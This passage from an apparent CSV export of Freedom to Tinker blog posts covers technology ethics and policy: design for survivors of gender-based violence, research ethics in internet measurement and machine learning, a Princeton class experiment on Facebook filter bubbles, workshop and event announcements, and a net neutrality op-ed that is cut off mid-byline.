FTC had the legal power to compel answers to factual questions about Google’s practices (and an obligation to keep the answers confidential) and, having conducted a thorough investigation, the FTC decided not to bring a case against Google. So why did the European authorities get a different result than the U.S. authorities? The answer might lie in differences between European and American competition law. Or it might lie in the fact that European authorities find it easier to enforce against a foreign company. Regardless of the reason, Google is presumably looking for ways to resolve the complaints that led to this investigation being started."
"181","2017-07-24","2023-03-24","https://freedom-to-tinker.com/2017/07/24/design-ethics-for-gender-based-violence-and-safety-technologies/","Authored (and organized) by Kate Sim and Ben Zevenbergen. Digital technologies are increasingly proposed as innovative solution to the problems and threats faced by vulnerable groups such as children, women, and LGBTQ people. However, there exists a structural lack of consideration for gender and power relations in the design of Internet technologies, as previously discussed by scholars in media and communication studies (Barocas & Nissenbaum, 2009; boyd, 2001; Thakor, 2015) and technology studies (Balsamo, 2011; MacKenzie and Wajcman, 1999). But the intersection between gender-based violence and technology deserves greater attention. To this end, scholars from the Center for Information Technology at Princeton and the Oxford Internet Institute organized a workshop to explore the design ethics of gender-based violence and safety technologies at Princeton in the Spring of 2017. The workshop welcomed a wide range of advocates in areas of intimate partner violence and sex work; engineers, designers, developers, and academics working on IT ethics. The objectives of the day were threefold: (1) to better understand the lack of gender considerations in technology design, (2) to formulate critical questions for functional requirement discussions between advocates and developers of gender-based violence applications; and (3) establish a set of criteria by which new applications can be assessed from a gender perspective. Following three conceptual takeaways from the workshop, we share instructive primers for developers interested in creating technologies for those affected by gender-based violence. Survivors, sex workers, and young people are intentional technology users Increasing public awareness of the prevalence gender-based violence, both on and offline, often frames survivors of gender-based violence, activists, and young people as vulnerable and helpless. Contrary to this representation, those affected by gender-based violence are intentional technology users, choosing to adopt or abandon tools as they see fit. For example, sexual assault victims strategically disclose their stories on specific social media platforms to mobilize collective action. Sex workers adopt locative technologies to make safety plans. Young people utilize secure search tools to find information about sexual health resources near them. To fully understand how and why some technologies appear to do more for these communities, developers need to pay greater attention to the depth of their lived experience with technology. Context matters Technologies designed with good intentions do not inherently achieve their stated objectives. Functions that we take for granted to be neutral, such as a ‘Find my iPhone’ feature, can have unintended consequences. In contexts of gender-based violence, abusers and survivors appropriate these technological tools. For example, survivors and sex workers can use such a feature to share their whereabouts with friends in times of need. Abusers, on the other hand, can use the locative functions to stalk their victims. It is crucial to consider the context within which a technology is used, the user’s relationship to their environment, their needs, and interests so that technologies can begin to support those affected by gender-based violence. Vulnerable communities perceive unique affordances Drawing from ecological psychology, technology scholars have described this tension between design and use as affordance, to explain how a user’s perception of what can and cannot be done on a device informs their use. Designers may create a technology with a specific use in mind, but users will appropriate, resist, and improvise their use of the features as they see fit. For example, the use of a hashtags like #SurvivorPrivilege is an example of how rape victims create in-groups on Twitter to engage in supportive discussions, without the intention of it going viral. ACTION ITEMS Predict unintended outcomes Relatedly, the idea of devices as having affordances allows us to detect how technologies lead to unintended outcomes. Facebook’s ‘authentic name’ policy may have been instituted to promote safety for victims of relationship violence. The social and political contexts in which this policy is used, however, disproportionately affects the safety of human rights activists, drag queens, sex workers, and others — including survivors of partner violence. Question the default Technology developers are in a position to design the default settings of their technology. Since such settings are typically left unchanged by users, developers must take into account the effect on their target end users. For example, the default notification setting for text messages display the full message content in home screen. A smartphone user may experience texting as a private activity, but the default setting enables other people who are physically co-present to be involved. Opting out of this default setting requires some technical knowledge from the user. In abusive relationships, the abuser can therefore easily access the victim’s text messages through this default setting. So, in designing smartphone applications for survivors, developers should question the default privacy setting. Inclusivity is not generalizability There appears to be an equation of generalizability with inclusivity. An alarm button that claims to be for generally safety purposes may take a one-size-fits-all approach by automatically connecting the user to law enforcement. In cases of sexual assault, especially involving those who are of color, in sex work, or of LGBTQ identities, survivors are likely to avoid such features precisely because of its connection to law enforcement. This means that those who are most vulnerable are inadvertently excluded from the feature. Alternatively, an alarm feature that centers on these communities may direct the user to local resources. Thus, a feature that is generalizable may overlook target groups it aims to support; a more targeted feature may have less reach, but meet its objective. Just as communities’ needs are context-based, inclusivity, too, is contextualized. Developers should realize that that the broader mission of inclusivity can in fact be completed by addressing a specific need, though this may reduce the scope of end-users. Consider co-designing How, then, can we develop targeted technologies? Workshop participants suggested co-design (similarly, user-participatory design) as a process through which marginalized communities can take a leading role in developing new technologies. Instead of thinking about communities as passive recipients of technological tools, co-design positions both target communities and technologists as active agents who share skills and knowledge to develop innovative, technological interventions. Involve funders and donors Breakout group discussions pointed out how developers’ organizational and funding structures play a key role in shaping the kind of technologies they create. Suggested strategies included (1) educating donors about the specific social issue being addressed, (2) carefully considering whether funding sources meet developers’ objectives, and (3) ensuring diversity in the development team. Do no harm with your research In conducting user research, academics and technologists aim to better understand marginalized groups’ technology uses because they are typically at the forefront of adopting and appropriating digital tools. While it is important to expand our understanding of vulnerable communities’ everyday experience with technology, research on this topic can be used by authorities to further marginalize and target these communities. Take, for example, how tech startups like this align with law enforcement in ways that negatively affect sex workers. To ensure that research done about communities can actually contribute to supporting those communities, academics and developers must be vigilant and cautious about conducting ethical research that protects its subjects. Should this app exist? The most important question to address at the beginning of a technology design process should be: Should there even be an app for this? The idea that technologies can solve social problems as long as the technologists just “nerd harder” continues to guide the development and funding of new technologies. Many social problems are not necessarily data problems that can be solved by an efficient design and padded with enhanced privacy features. One necessary early strategy of intervention is to simply raise the question of whether technologies truly have a place in the particular context and, if so, whether it addresses a specific need. Our workshop began with big questions about the intersections of gender-based violence and technology, and concluded with a simple but piercing question: Who designs what for whom? Implicated here are the complex workings of gender, sexuality, and power embedded in the lifetime of newly emerging devices from design to use. Apps and platforms can certainly have their place when confronting social problems, but the flow of data and the revealed information must be carefully tailored to the target context. If you want to be involved with these future projects, please contact Kate Sim or Ben Zevenbergen. The workshop was funded by the Princeton’s Center for Information Technology Policy, Princeton’s University Center for Human Values, the Ford Foundation, the Mozilla Foundation, and Princeton’s Council on Science and Technology."
"182","2017-08-23","2023-03-24","https://freedom-to-tinker.com/2017/08/23/getting-serious-about-research-ethics-security-and-internet-measurement/","[This blog post is a continuation of our series about research ethics in computer science that we started last week] Research projects in the information security and Internet measurement sub-disciplines typically interact with third-party systems or devices to collect a large amounts of data. Scholars engaging in these fields are interested to collect data about technical phenomenon. As a result of the widespread use of the Internet, their experiments can interfere with human use of devices and reveal all sorts of private information, such as their browsing behaviour. As awareness of the unintended impact on Internet users grew, these communities have spent considerable time debating their ethical standards at conferences, dedicated workshops, and in journal publications. Their efforts have culminated in guidelines for topics such as vulnerability disclosure or privacy, whereby the aim is to protect unsuspecting Internet users and human implicated in technical research. Prof. Nick Feamster, Prof. Prateek Mittal, moderator Prof. Elana Zeide, and I discussed some important considerations for research ethics in a panel dedicated to these sub-disciplines at the recent CITP conference on research ethics in computer science communities. We started by explaining that gathering empirical data is crucial to infer the state of values such as privacy and trust in communication systems. However, as methodological choices in computer science will often have ethical impacts, researchers need to be empowered to reflect on their experimental setup meaningfully. Prof. Feamster discussed several cases where he had sought advice from ethical oversight bodies, but was left with unsatisfying guidance. For example, when his team conducted Internet censorship measurements (pdf), they were aware that they were initiating requests and creating data flows from devices owned by unsuspecting Internet users. These new information flows were created in realms where adversaries were also operating, for example in the form of a government censors. This may pose a risk to the owners of devices that were implicated in the experimentation and data collection. The ethics board, however, concluded that such measurements did not meet the strict definition of “human subjects research”, which thereby excluded the need for formal review. Prof. Feamster suggests computer scientists reassess how they think about their technologies or newly initiated data flows that can be misused by adversaries, and take that into account in ethical review procedures. Ethical tensions and dilemmas in technical Internet research could be seen as interesting research problems for scholars, argued Prof. Mittal. For example, to reason about privacy and trust in the anonymous Tor network, researchers need to understand to what extent adversaries can exploit vulnerabilities and thus observe Internet traffic of individual users. The obvious, relatively easy, and ethically dubious measurement would be to attack existing Tor nodes and attempt to collect real-time traffic of identifiable users. However, Prof. Mittal gave an insight into his own critical engagement with alternative design choices, which led his team to create a new node within Princeton’s university network that they subsequently attacked. This more lab-based approach eliminates risks for unsuspecting Internet users, but allowed for the same inferences to be done. I concluded the panel, suggesting that ethics review boards at universities, academic conferences, and scholarly journals engage actively with computer scientists to collect valuable data whilst respecting human values. Currently, a panel on non-experts in either computer science or research ethics are given a single moment to judge the full methodology of a research proposal or the resulting paper. When a thumbs-down is issued, researchers have no or limited opportunity to remedy their ethical shortcomings. I argued that a better approach would be an iterative process with in-person meetings and more in-depth consideration of design alternatives, as demonstrated in a recent paper about Advertising as a Platform for Internet measurements (pdf). This is the approach advocates in the Networked Systems Ethics Guidelines. Cross-disciplinary conversation, rather than one-time decisions, allow for a mutual understanding between the gatekeepers of ethical standards and designers of useful computer science research. See the video of the panel here."
"183","2017-09-18","2023-03-24","https://freedom-to-tinker.com/2017/09/18/getting-serious-about-research-ethics-ai-and-machine-learning/","[This blog post is a continuation of our series about research ethics in computer science.] The widespread deployment of artificial intelligence and specifically machine learning algorithms causes concern for some fundamental values in society, such as employment, privacy, and discrimination. While these algorithms promise to optimize social and economic processes, research in this area has exposed some major deficiencies in the social consequences of their operation. Some consequences may be invisible or intangible, such as erecting computational barriers to social mobility through a variety of unintended biases, while others may be directly life threatening. At the CITP’s recent conference on computer science ethics, Joanna Bryson, Barbara Engelhardt, and Matt Salganik discussed how their research led them to work on machine learning ethics. Joanna Bryson has made a career researching artificial intelligence, machine learning, and understanding their consequences on society. She has found that people tend to identify with the perceived consciousness of artificially intelligent artifacts, such as robots, which then complicates meaningful conversations about the ethics of their development and use. By equating artificially intelligent systems to humans or animals, people deduce its moral status and can ignore their engineered nature. While the cognitive power of AI systems can be impressive, Bryson argues they do not equate to humans and should not be regulated as such. On the one hand, she demonstrates the power of an AI system to replicate societal biases in a recent paper (co-authored with CITP’s Aylin Caliskan and Arvind Narayanan) by letting systems trained on a corpus of text from the World Wide Web learn the implicit biases around the gender of certain professions. On the other hand, she argues that machines cannot ‘suffer’ in the same way as humans do, which is one of the main deterrents for humans in current legal systems. Bryson proposes we understand both AI and ethics as human-made artifacts. It is therefore appropriate to rely ethics – rather than science – to determine the moral status of artificially intelligent systems. Barbara Engelhardt’s work focuses on machine learning in computational biology, specifically genomics and medicine. Her main area of concern is the reliance on recommendation systems, such as we encounter on Amazon and Netflix, to make decisions in other domains such as healthcare, financial planning, and career decisions. These machine learning systems rely on data as well as social networks to make inferences. Engelhardt describes examples where using patient records to inform medical decisions can lead to erroneous recommendation systems for diagnosis as well as harmful medical interventions. For example, the symptoms of heart disease differ substantially between men and women, and so do their appropriate treatments. Most data collected about this condition was from men, leaving a blind spot for the diagnosis of heart disease in women. Bias, in this case, is useful and should be maintained for correct medical interventions. In another example, however, data was collected from a variety of hospitals in somewhat segregated poor and wealthy areas. The data appear to show that cancers in children from hispanic and caucasian races develop differently. However, inferences based on this data fail to take into account the biasing effect of economic status in determining at which stage of symptoms different families decide seek medical help. In turn, this determines the stage of development at which the oncological data is collected. The recommendation system with this type of bias confuses race with economic barriers to medical help, which will lead to harmful diagnosis and treatments. Matt Salganik proposes that the machine learning community draws some lessons from ethics procedures in social science. Machine learning is a powerful tool the can be used responsibly or inappropriately. He proposes that it can be the task of ethics to guide researchers, engineers, and developers to think carefully about the consequences of their artificially intelligent inventions. To this end, Salganik proposes a hope-based and principle-based approach to research ethics in machine learning. This is opposed to a fear-based and rule-based approach in social science, or the more ad hoc ethics culture that we encounter in data and computer science. For example, machine learning ethics should include pre-research review through forms that are reviewed by third parties to avoid groupthink and encourage researchers’ reflexivity. Given the fast pace of development, though, the field should avoid a compliance mentality typically found at institutional review boards of univeristies. Any rules to be complied with are unlikely to stand the test of time in the fast-moving world of machine learning, which would result in burdensome and uninformed ethics scrutiny. Salganik develops these themes in his new book Bit By Bit: Social Research in the Digital Age, which has an entire chapter about ethics.” See a video of the panel here."
"184","2017-09-19","2023-03-24","https://freedom-to-tinker.com/2017/09/19/what-our-students-found-when-they-tried-to-break-their-bubbles/","This is the second part of a two-part series about a class project on online filter bubbles. In this post, where we focus on the results. You can read more about our pedagogical approach and how we carried out the project here. By Janet Xu and Matthew J. Salganik This past spring, we taught an undergraduate class on social networks at Princeton University which involved a multi-week, student-led collective class project about algorithmic filter bubbles on Facebook. We wanted to expose students to the process of doing real research, and filter bubbles seemed like an attractive topic because they are interesting, important, and tricky to study. The project—which we called Breaking Your Bubble—had three steps: measuring your bubble, breaking your bubble, and studying the effects. In short, all 130 undergraduates in the class measured their Facebook News Feed for four weeks—recording the slant (liberal, neutral, or conservative) of the political posts that they saw. Then, starting in the second week of the project, students implemented procedures they had developed in order to change their News Feeds, with the goal of achieving a “balanced diet” that matched the baseline distribution of what is being shared on Facebook. Students also came up with public opinion questions for a big class survey, which they took at both the beginning and the end of the project. You can read more about what exactly we did, how it worked, and what we’d do differently next time here. Though our primary goal was to teach students about doing research, we also learned some surprising things about the Facebook News Feed from the aggregated student results. News Feed Composition So, were students able to break their bubble? Initially, we expected that because the News Feed algorithm is complicated, it might be hard for students to break out of their bubbles. But we were wrong. The class was able to move to a more balanced diet pretty quickly. Here’s the change in their News Feeds in the aggregate. By weeks 2 and 3 the results are very similar to the target distribution, which was the type of content being shared on Facebook overall as reported in Bakshy et al (2015). Even though students in each of the 12 precepts (that’s what we call discussion sections) came up with their own strategies for breaking their bubbles, almost all of the 12 strategies worked well. To be fair, some of those strategies shared the same tactics (e.g. like new Pages that are not aligned with your political beliefs). But we were still surprised that pretty much all of the strategies worked for achieving a balanced feed. The second major unexpected finding is that our students’ News Feeds just aren’t that political. Plots like the one above are a bit misleading because they show the ideological distribution of political content. However, most content in their News Feeds is not political. Here’s a different way of looking at the same data: Political news makes up less than 20% of News Feed posts, even after students had deliberately sought out more political content by following new media outlets. This important point is missed by services like The Wall Street Journal’s Blue Feed, Red Feed, which just focus on political stories (a point that already been made elsewhere). On students’ real News Feeds, each political post is surrounded by memes, personal posts, apolitical ads, and more memes. Some students reported scrolling through hundreds of posts before coming across five political stories. Moreover, we learned that students didn’t break their bubbles by a one-to-one replacement of belief-consistent news with cross-cutting news. In trying to consume more cross-cutting news, they also ended up consuming more belief-consistent news. For example, a liberal student saw a higher proportion of conservative stories among the political news in their News Feed after the activity, but they also saw more liberal stories among their overall News Feed content than they did before. Or, to extend our “balanced diet” metaphor further, we can think of cross-cutting information as vegetables and information that is consistent with prior beliefs as meat. Before the activity, people ate a lot more meat than they did vegetables. But in the process of achieving balanced diets, people had to eat a lot more food in general. The new food they ate was mostly vegetables, but they also ate a little more meat. In the end, their diets were more balanced, but they still ended up eating more meat than they did at the beginning. Attitudes Even though students were able to change the content of their feeds, our comparison of the pre- and post-bubble breaking survey didn’t reveal much change in attitudes. However, in addition to this rather crude survey-based measure, we also asked students to reflect on the experience. These reflections revealed some more subtle impacts that were missed in the survey: Greater exposure to cross-cutting content increased awareness and perspective-taking: Many students reported that even though their personal stance on issues like gun rights, healthcare policies, foreign policy, and abortion didn’t change, they now have better understanding of why people on the “other side” have opposing views. This inspired some students to be more informed and politically engaged: This statement from a student exemplified this theme: “Now that I have been liking these political pages online and reading more about what is happening in terms of US politics, I am beginning to understand and appreciate more about how tough these decisions are. Just yesterday, I saw online that Trump’s list of new tax cuts were coming out and prior to this experiment, I would never have known this or much less read it, but I clicked on the link and read about how he intends to cut taxes on business and individuals. I even read about how there is much debate as whether he is doing this under his own agenda because of how much the tax cut will save his own business revenue. Therefore, I am not sure if my exact attitudes are changing in terms of my political views, but I am sure that I am becoming more aware of what’s happening today.” Analogously, other students reported that they now care about a wider range of issues. But there was also a backfire effect: Many students noted that exposure to opposing views actually caused them to embrace their prior convictions more—something akin to the backfire effect. Given that some students also saw a slight increase in news that were consistent with their prior beliefs, we might consider that this increased conviction is merely due to increased reinforcement. But almost all students who talked about this couched it in their experiences of reading the opposing views. For example, one student wrote, “the breaking of the bubble may have instead reinforced my views because of some of the poor writing and argumentation done by the opposing ideology.” Another student echoed, “even understanding the other side did not push me to agree with them. It actually strengthened my views on certain issues.” There were even a few cases where the cross-cutting exposure seemed to galvanize polarization; one student wrote that “if anything, I have become more convicted in my original views and more willing to voice them.” And perceptions of other Americans did change: Filter bubbles don’t just encourage people to ignore opposing views; they also create the illusion that the opposing viewpoint is the minority. The activity seemed to have had greater effects for shattering the latter illusion. One student wrote, “The only belief of mine that changed was that there were more people that supported Trump than I had realized. I had read and watched videos praising Trump, which is something I hadn’t experienced before. Even though I disagreed with them and wasn’t swayed by their reasoning, it made me realize that these were huge media companies that must be running on a lot of support across the country that I wasn’t aware of.” Another student summarized this theme succinctly: “Breaking the bubble was more effective in changing my perception of the general distribution of views in the wider population than it was in changing my personal opinion on political issues.” Conclusion We set out to teach 130 undergraduate students about evaluating and doing real, modern research. In addition to learning about the realities of social science research, we all found out some things we didn’t quite expect about the Facebook News Feed, such as how students are able to break out of their bubbles if they make a consistent and concerted effort. We also got some nuanced insight into how students react to cross-cutting content when they’re exposed to it—in other words, what actually happens when filter bubbles are broken. Because of the methodology we used—described in a prior post—these results should be interpreted with caution, but we hope that they provide a starting point for future teaching and research. Notes: Some of my (Matt’s) research has been funded by Facebook. This is on my CV, but we also explicitly disclosed this to the students, and we had a discussion about industry-funded research and conflicts of interest. I also pointed them to this article in the Intercept. Thanks to the other teaching staff for helping us shape this activity: Romain Ferrali, Sarah Reibstein, Ryan Parsons, Ramina Sotoudeh, Herrissa Lamothe, and Sam Clovis."
"185","2017-09-19","2023-03-24","https://freedom-to-tinker.com/2017/09/19/breaking-your-bubble/","This is the first part of a two-part series about a class project on online filter bubbles. In this post, we talk about our pedagogical approach and how we carried out the project. To read more about the results of the project, go to Part Two. By Janet Xu and Matthew J. Salganik The 2016 US presidential election dramatically increased public attention to online filter bubbles and their impacts on society. These online filter bubbles—roughly, personalized algorithms that over-expose people to information that is consistent with their prior beliefs—are interesting, important, and tricky to study. These three characteristics made online filter bubbles an ideal topic for our undergraduate social network class. In this post, we will describe a multi-week, student-led project on algorithmic filter bubbles that we ran with 130 students. We’ll describe what we did, how it worked, and what we’d do differently next time. You can read about what we learned from the results — which turned out to be pretty surprising — here. In the spring of 2017, we taught an undergraduate class on social networks at Princeton University. The most important learning objectives for the course, which is targeted at sophomores and has no prerequisites, were to evaluate real, modern research and to begin to create new research. Given these learning objectives, we wanted the students to have the experience of actually doing new research, but this is difficult in a class with 130 students. Therefore, we decided to do one big group project. In fact, it turned out that by doing a group project we were able to do things that would have been impossible with individual projects. Thus, a large class turned out to be a feature, not just a bug. And the structure that we developed could easily scale to much larger classes. As described at the beginning of the post, algorithmic filter bubbles seemed like an attractive focus of the project because they are interesting, important, and tricky to study. We considered a variety of algorithmic filter bubbles that could be studied, and we quickly settled on the Facebook News Feed because Facebook has more active users than any other online social networking platform, a majority of its users get news on that platform, it has been the subject of prior research, and it was easily accessible to all our students (they all had Facebook accounts). What we did The project—which we called Breaking Your Bubble—had three steps: measuring your bubble, breaking your bubble, and studying the effects. In order to prepare students for the project, we introduced them to the ideas of filter bubbles, and we taught them about how the News Feed works. To make them sensitive to the methodological issues involved in participating in your own research, we also taught them about the trade-offs involved with self-experimentation. With this background—covered by these readings (1 and 2) and these slides (1 and 2)—students were ready to get started. In the first step, students measured their filter bubble. More specifically, for homework, at three different time points each week, they scrolled through their feeds until they found five political posts (ads included). Then, they coded these posts as either liberal, neutral, or conservative. Students also kept track of how many posts they had to scroll through to get to five posts as a measure of how much political content was in their feed. All the data were uploaded through Google forms, and we used it to create a class aggregate, which you can see in this post. In “precept” (that’s what we call discussion section), students discussed the challenges with doing these measurements. Of course, it turned out that people coded and counted things differently, which was exactly what we wanted them to experience. Then, the students speculated how “breaking your bubble” might actually change public opinion, and each precept came up with one survey question that operationalized an issue that they thought might be susceptible to attitudinal change. We compiled this into a survey that the entire class took as a pre-test measurement before breaking their bubble. In the second step, the students developed and implemented a procedure to break their bubble. Their goal was to achieve a “balanced diet” of liberal, neutral, and conservative political content that matched the baseline distribution of what is being shared on Facebook as reported in Bakshy et al (2015). Given this goal, as part of their homework, each student had to propose a procedure that could be followed by someone else in the class that would lead to a balanced diet. Then, in precept, students discussed these procedures and each precept settled on one procedure, but these procedures varied a lot form precept to precept. For example, they ranged from removing all “Liked” pages and targeted advertising preferences, to “hiding” posts from sources that aligned with one’s political orientation, to clicking on more cross-cutting stories. The most popular strategy—adopted to some extent by almost every precept—was to follow media outlets associated with the opposite party. These strategies were implemented for three weeks, during which time the students continued to measure the content of their News Feeds. In order to keep students engaged during this time, we also had weekly data reviews and check-ins in precept. Finally, at the end of the semester, students took the attitudes survey again as post-test measurement. Were students able to break their bubbles? See our results here. How did students learn? Did doing this kind of class project help students accomplish the learning objectives, which were to evaluate modern research and begin to create new research? We asked students to evaluate how the project helped them understand the theories and concepts introduced in class, how their overall experience was and what they learned, and if they would recommend the Breaking Your Bubble to students in the future. Nearly 90% of the students said that the project helped them understand the theories and concepts covered in class. However, only a third of the class thought that it contributed uniquely to their learning experience and a little more than half of the students thought that they didn’t need to alter their own Facebook News Feeds to understand filter bubbles (fair). About two-thirds of students recommended the project to future students. In open-ended evaluation questions, some students remarked that they would recommend the process of designing and conducting a scientific study together because that was interesting, but they did not like manipulating their own experiences as study participants. On the whole, students thought that they learned something about social scientific research by doing the project. Somewhat paradoxically, the experience seemed to increase both appreciation and skepticism towards social scientific research! What we would do differently next time Doing a project like this requires lots of trade-offs. For example, from a scientific perspective it would have been better if we randomly selected half the class to break their bubble and had half the class do nothing. But, this would have deprived half of the class from an important part of the learning experience. When faced with these trade-offs our general strategy was to discuss them with the students and be clear about why we were doing what we were doing. In general, we erred on the side of making this a good learning experience, at the expense of the scientific robustness of our findings. One consistent piece of feedback we got from students was that the experiment didn’t run long enough. They surmised that attitude change takes time, and three weeks of exposure to cross-cutting content wasn’t enough. Another piece of feedback was that the repeated measurements became tedious. It would have been easier for students to just read only the first 20 posts, rather than reading until they got to five political stories. Or we could have asked them to make the measurement once per week rather than three times. We also heard informally that some students might not have taken the data collection very seriously because it was tedious at times. This is something that we’d probably discuss with the students explicitly as part of the trade-offs in research. Also, it might have been nice if each student could have received an individual-level estimate of the effect of their feed on them. This might be possible with an N-of-1 experimental design, but it would have require some kind of app to more finely control the students’ News Feeds (which would have introduced a variety of complications). Finally, we didn’t get much chance to explore how people hand-coded each of their posts as “liberal,” “neutral,” or “conservative.” Many students pointed out that they themselves were biased towards finding more cross-cutting content over time. It would have been a nice addition to add some kind of inter-coder reliability study. Conclusion We set out to conduct a multi-week, group research project in a class with 130 undergraduate students. Overall, we are pretty happy with how it turned out. The students seemed to learn about the excitement, challenge, and occasional drudgery of social science research. And we all learned some things that we didn’t quite expect about the News Feed, which you can read about here! Notes: We also did a mini-class project on the Google search algorithm. Here’s how it worked. In class, students proposed search terms that they thought would produce big differences when searched for by other members of the class. We wrote these suggestions on the board and then the students voted on six: marijuana, vaccination, Ferguson, MO, feminism, immigration crisis, and climate change. Then everyone in class searched for these terms and posted the results on Piazza (our online class discussion forum). At the beginning of the next class, I summarized the results, which is that the search results were not very different (slides). Then we speculated some about how this might have been different with a more diverse groups of searchers in terms of age and geographic location. Some of my (Matt’s) research has been funded by Facebook. This is on my CV, but we also explicitly disclosed this to the students, and we had a discussion about industry-funded research and conflicts of interest. I also pointed them to this article in the Intercept. We prepared an alternative assignment in case some students did not have a Facebook account. This alternative assignment was basically a time diary for people to record when and how they discussed political news with others. This way, students would still be able to construct similar measures about cross-cutting exposure and participate in class discussions. However, because every student had a Facebook account, we did not need to use the alternative assignment. If you do this for your class, you should consider how you can include students without Facebook accounts to make sure they don’t miss out on the learning experience. Thanks to the other teaching staff for helping us shape this activity: Romain Ferrali, Sarah Reibstein, Ryan Parsons, Ramina Sotoudeh, Herrissa Lamothe, and Sam Clovis."
"186","2017-10-20","2023-03-24","https://freedom-to-tinker.com/2017/10/20/the-second-workshop-on-technology-and-consumer-protection/","Arvind Narayanan and I are excited to announce that the Workshop on Technology and Consumer Protection (ConPro ’18) will return in May 2018, once again co-located with the IEEE Symposium on Security and Privacy. The first ConPro brought together researchers from a wide range of disciplines, united by a shared goal of promoting consumer welfare through empirical computer science research. The topics ranged from potentially misleading online transactions to emerging biomedical technologies. Discussions were consistently insightful. For example, one talk explored the observed efficacy of various technical and non-technical civil interventions against online crime. Several—including a panel with technical and policy experts—considered steps that researchers can take to make their work more usable by policymakers, such as examining and documenting the agreement between researched practices and a company’s public statements. We think the first workshop was a success. Participants were passionate about the social impact of their own research, and just as passionate in encouraging similarly thoughtful but dramatically different work. We aim to foster and build this engaged and supportive community. As a result, we are thrilled to be organizing a second ConPro. Our interests lie wherever computer science intersects with consumer protection, including security, e-crime, algorithmic fairness, privacy, usability, and much more. Our stellar program committee reflects this range of interests. Check out the call for papers for more information. The submission deadline is January 23, 2018, and we look forward to reading this year’s great work!"
"187","2017-11-22","2023-03-24","https://freedom-to-tinker.com/2017/11/22/ai-and-policy-event-in-dc-december-8/","Princeton’s Center for Information Technology Policy (CITP) recently launched an initiative on Artificial Intelligence, Machine Learning, and Public Policy. On Friday, December 8, 2017, we’ll be in Washington DC talking about AI and policy. The event is at the National Press Club, at 12:15-2:15pm on Friday, December 8. Lunch will be provided for those who register in advance. The agenda includes: Ed Felten, with a background briefing on AI and the AI policy landscape, Arvind Narayanan on AI and fairness, Olga Russakovsky on diversifying the AI workforce, Chloe Bakalar on AI and ethics, and Nick Feamster on AI and freedom of expression. For those who can stay longer, we’ll have a roundtable discussion with the speakers, starting at 2:30."
"188","2017-12-12","2023-03-24","https://freedom-to-tinker.com/2017/12/12/why-the-fcc-should-prevent-isps-from-micromanaging-our-lives/","Why the FCC should prevent ISPs from micromanaging our lives by Brett Frischmann and Evan Selinger* Network neutrality prevents broadband Internet service providers from micromanaging our lives online. Constraining the networks this way enables and even empowers Internet users to be active and productive human beings rather than passive consumers. Unfortunately, the network neutrality debate is so polarized that neither side sees the full picture. On one side, opponents of net neutrality view the Federal Communication Commission’s 2015 Open Internet order as “heavy-handed government regulation” that excessively meddles with broadband Internet Service Providers like Verizon and Comcast. Opponents are looking at a fun house mirror. Despite their repeated false claims that the government will micromanage the Internet through burdensome price regulation, the Open Internet Order only constrains micromanagement by broadband Internet Service Providers. Opponents ignore—if not intentionally distort—the concentrated private power of ISPs, while grossly exaggerating the scope and impact of the FCC’s actual rules. On the other side, net neutrality advocates see the FCC’s intervention as light regulation that levels the playing field for edge providers—big content companies like Google and Netflix that deliver services to consumers from the edge of the network. Advocates worry that such providers can be squeezed out if ISPs discriminate in favor of their own programming or affiliates—think about on-demand television versus streaming television services, for example. While net neutrality proponents push for the right policy, they aren’t making the strongest case possible and often concede too much ground. In their rush to protect content providers, they shoot themselves in the foot by perpetuating the mythical division between edge providers and ordinary end-users, thus seeming to forget that everyone online is exchanging content. We’re all content providers. Everything that occurs on the Internet is an exchange of data between end-users. That’s the beauty of the Internet. It opens the door widely for all of us to create, socialize, innovate, and possibly become the next Google or Wikipedia. Unfortunately, advocate distortion diminishes who we are, who we can be, and the social goods we can create by reductively portraying most of us as passive content consumers. What they don’t get or sufficiently highlight is that the infrastructure of the Internet profoundly impacts what we believe is important, true, and worth pursuing throughout all aspects of our lives. Net Neutrality is a reflection of how society answers three fundamental political questions: Who decides what you do? Who decides who you communicate, transact, and collaborate with? Who decides how you should live your life? To see what we mean, first consider how indispensable the Internet is for participating in modern life and how deeply it influences the ways we think and act, work and play. Beyond the growth in electronic commerce and innovations that were unimaginable only two decades ago, the Internet has radically increased entrepreneurship, political discourse, the production and consumption of media, social network formation, and community building. Indeed, the Internet provides and shapes essential opportunities for individuals, firms, households, and other organizations to interact with each other. The Internet hasn’t just reconfigured our lived-in environments and transformed capitalism. It’s re-engineered our world. Next, consider how net neutrality is fundamentally about social control. The social value of the Internet is attributable to its openness, originally enshrined in end-to-end architecture and subsequently protected by the technical difficulties ISPs faced in figuring out who was doing what online in real-time with sufficient accuracy to exercise control over their activities. Over the past two decades, ISPs invested in developing the technical capability to monitor data streams and develop actionable intelligence that allows them to manage traffic. Keep in mind that “traffic management” is a euphemism for surveillance and control. As with any infrastructure system, some control by ISPs is inevitable and desirable. “Network neutrality” only prevents broadband Internet service providers from using intelligence about end-users and uses (who’s doing what online) to exercise control through the specific means of blocking, throttling, and paid prioritization of data packets. It leaves untouched conventional means for managing congestion, such as congestion pricing, that do not rely on who’s doing what online and instead rely on the timing and quantity of traffic flows. Clarification: Conventional congestion pricing that is practiced in other sectors and is well understood in economics does not require discrimination based on use or user and is not in any way precluded by the network neutrality rules. There are reasons we don’t see it much on the Internet, but the reasons are not legal constraints. For the past decade, the FCC has struggled to create legal constraints that stand in for the disappearing technical limitations on ISP control. Every time the FCC succeeded, ISPs fought back and challenged the rules. Network neutrality opponents fear that network neutrality rules will lead to price regulation. But those fears are unfounded. Most recently, the FCC’s 2015 Open Internet order reclassified broadband Internet access service as a telecommunications service subject to common carrier regulation under Title II of the Telecommunication Act. Title II lays the foundation for potentially restrictive government regulation, including [cue the scary, dramatic music: dah, dah, dah] price regulation. Fortunately, the FCC exercised substantial forbearance when enacting the Open Internet order. It only sought to solidify the basic principles that it has strongly supported since 2004 and that have been reflected in its previous policy statement, enforcement actions, merger conditions, and 2010 rules. Price regulation is not and has not ever been a feature of network neutrality. Still, the phantom of regulatory creep—that the FCC would use its authority to go beyond network neutrality, implement price controls, and take over the Internet—lurks and scares the hell out of conservatives, even though such expansion would never happen in our contemporary political climate. In reality, network neutrality in general, and the 2015 Open Internet Order in particular, aim to prevent Broadband Internet service providers from micromanaging what we do online. As we extend Internet-connected sensors to other infrastructures—transportation and electricity—and into other spaces—cities, workplaces, and homes—society will need to grapple with how to govern intelligence and intelligence-enabled control. Frankly, if we can’t get network neutrality for the Internet, it’s hard to imagine we’ll get it for the other, high-stakes intelligence-enabled control systems we’re building. * Brett M. Frischmann, Charles Widger Endowed University Professor in Law, Business and Economics, Villanova University, and Evan Selinger, Professor 